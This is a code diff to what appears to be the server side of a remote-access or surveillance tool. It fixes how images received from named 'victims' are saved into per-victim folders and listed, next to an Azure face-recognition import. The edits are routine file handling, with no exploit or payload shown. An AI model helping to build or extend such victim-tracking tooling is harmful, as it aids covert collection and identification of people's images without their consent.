@@ -3,7 +3,7 @@ from azure import faceRec
 import threading, socket, time, sys
 import json
 from PIL import Image
-from os import listdir
+import os
 
 
 class MultiHandler:
@@ -288,10 +288,12 @@ class MultiHandler:
 			if victim_name:
 				try:
 					image_path = "./DB/pictures/" + filename
-					personal_db_image_path = "./DB/" + victim_name + "/Images/" + filename
+					personal_db_image_path = "./DB/" + victim_name + "/Images/"
+					if not os.path.exists(personal_db_image_path):
+						os.makedirs(personal_db_image_path)
 					image = Image.open(image_path)
-					image.save(personal_db_image_path, optimize=True, quality=10)
-					h.info_general("Saved to" + personal_db_image_path)
+					image.save(personal_db_image_path+filename, optimize=True, quality=10)
+					h.info_general("Saved to" + personal_db_image_path + filename)
 					return
 				except:
 					h.info_error("Image save path error")
@@ -331,7 +333,9 @@ class MultiHandler:
 			if victim_name:
 				try:
 					personal_db_image_path = "DB/" + victim_name + "/Images/"
-					images = listdir(personal_db_image_path)
+					if not os.path.exists(personal_db_image_path):
+						os.makedirs(personal_db_image_path)
+					images = os.listdir(personal_db_image_path)
 					total_images = len(images)
 					results = {}
 					results['images'] = images
@@ -339,7 +343,7 @@ class MultiHandler:
 					results['image_path'] = personal_db_image_path
 					return results
 				except:
-					h.info_error("Image save path error")
+					h.info_error("Fetching Images Error")
 					return None
 			else:
 				h.info_general("Haven't found the target victim")
